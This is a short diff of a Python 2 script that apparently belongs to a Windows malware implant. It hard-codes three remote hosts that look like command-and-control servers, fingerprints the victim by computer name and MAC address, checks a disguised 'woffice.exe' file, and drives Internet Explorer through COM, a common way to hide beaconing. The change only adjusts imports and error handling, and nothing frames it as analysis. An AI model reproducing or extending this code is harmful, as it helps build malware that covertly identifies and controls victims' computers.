@@ -3,8 +3,8 @@
 #import win32event
 
 #import servicemanager
-import threading
-import asyncore
+#import threading
+#import asyncore
 import time
 import sys
 import os
@@ -113,8 +113,12 @@ site1="paner.altervista.org"
 site2="52.26.124.145"
 site3="certificates.ddns.net"
 smacaddress = get_macaddress('localhost')
-sTime=time.ctime(os.path.getmtime(suser+'\\woffice.exe'))
-sTime=sTime.replace(" ","_")
+sTime=0
+try:
+    sTime=time.ctime(os.path.getmtime(os.getcwd()+'\\woffice.exe'))
+    sTime=sTime.replace(" ","_")
+except Exception,e:
+    print str(e)
 sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress#+"_"+os.getenv('USERNAME')
 pythoncom.CoInitialize()
 ie = Dispatch("InternetExplorer.Application")
